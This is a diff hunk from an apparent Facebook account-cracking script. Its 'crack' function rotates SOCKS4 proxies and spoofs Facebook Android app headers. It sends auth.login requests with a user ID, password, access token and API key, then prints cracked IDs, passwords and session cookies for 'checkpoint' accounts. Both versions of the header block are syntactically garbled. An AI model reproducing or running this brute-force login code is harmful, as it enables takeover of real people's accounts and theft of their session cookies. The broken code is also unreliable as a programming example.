@@ -476,26 +476,26 @@ def crack(idf,pwv):
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update('https://api.facebook.com/auth/login')
-('User-Agent', '[FBAN/FB4A;FBAV/3146.0.0.808.9[FBAN/FB4A;FBAV/2806.0.0.88.96;[FBAN/FB4A;FBAV/308.0.0.88.96;[FBAN/FB4A;FBAV/6587.0.0.88.96;FBBV/52811016876;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/RMX11480n;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=706,height=1174};FB_FW/1;]')
-('Accept-Encoding', 'gzip, deflate')
-('Accept', '*/*')
-('Connection', 'keep-alive')
-('Content-Type', 'application/x-www-form-urlencoded')
-('Host', 'graph.facebook.com')
-('X-FB-Net-HNI', '38763')
-('X-FB-SIM-HNI', '29337')
-('X-FB-Connection-Type', 'MOBILE.LTE')
-('X-Tigon-Is-Retry', 'False')
-('x-fb-session-id', 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62')
-('x-fb-device-group', '5120')
-('X-FB-Friendly-Name', 'ViewerReactionsMutation')
-('X-FB-Request-Analytics-Tags', 'graphservice')
-('X-FB-HTTP-Engine', 'Liger')
-('X-FB-Client-IP', 'True')
-('X-FB-Server-Cluster', 'True')
-('x-fb-connection-token', 'd29d67d37eca387482a8a5b740f84f62')
-'adid=1f91fa46-9dfe-415b-9d4e-d2bf3e4bdd59&format=json&device_id=c247bf1f-015a-4239-ab38-8ea387c44266&cpl=true&family_device_id=32d3663b-1b6d-4c97-9a00-4cc685fda8db&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=device_based_login&email=100045164836473&password=778877&access_token=350685531728%257C62f8ce9f74b12f84c123cc23437a4a32&generate_session_cookies=1&meta_inf_fbmeta=&advertiser_id=890c5200-fc76-4cdc-8729-f3c69215011d&currently_logged_in_userid=0&locale=en_US&client_country_code=US&method=auth.login&fb_api_req_friendly_name=authenticate&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler&api_key=882a8490361da98702bf97a021ddc14d'
+			ses.headers.update('https://api.facebook.com/auth/login
+'User-Agent', '[FBAN/FB4A;FBAV/23.0.0.4018;FBBV/6001328;[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429651007;FBDM/{density=3.0,width=1080,height=2130};FBLC/en_US;FBRV/433511452;FBCR/MY MAXIS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PAR-LX9;FBSV/8.8.8;FBOP/9;FBCA/armeabi-v7a:armeabi;]'
+'Accept-Encoding', 'gzip, deflate'
+'Accept', '*/*'
+'Connection', 'keep-alive'
+'Content-Type', 'application/x-www-form-urlencoded'
+'Host', 'graph.facebook.com'
+'X-FB-Net-HNI', '38763'
+'X-FB-SIM-HNI', '29337'
+'X-FB-Connection-Type', 'MOBILE.LTE'
+'X-Tigon-Is-Retry', 'False'
+'x-fb-session-id', 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62'
+'x-fb-device-group', '5120'
+'X-FB-Friendly-Name', 'ViewerReactionsMutation'
+'X-FB-Request-Analytics-Tags', 'graphservice'
+'X-FB-HTTP-Engine', 'Liger'
+'X-FB-Client-IP', 'True'
+'X-FB-Server-Cluster', 'True'
+'x-fb-connection-token', 'd29d67d37eca387482a8a5b740f84f62'
+adid=1f91fa46-9dfe-415b-9d4e-d2bf3e4bdd59&format=json&device_id=c247bf1f-015a-4239-ab38-8ea387c44266&cpl=true&family_device_id=32d3663b-1b6d-4c97-9a00-4cc685fda8db&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=device_based_login&email=100045164836473&password=778877&access_token=350685531728%257C62f8ce9f74b12f84c123cc23437a4a32&generate_session_cookies=1&meta_inf_fbmeta=&advertiser_id=890c5200-fc76-4cdc-8729-f3c69215011d&currently_logged_in_userid=0&locale=en_US&client_country_code=US&method=auth.login&fb_api_req_friendly_name=authenticate&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler&api_key=882a8490361da98702bf97a021ddc14d
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#SHANTO-King
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
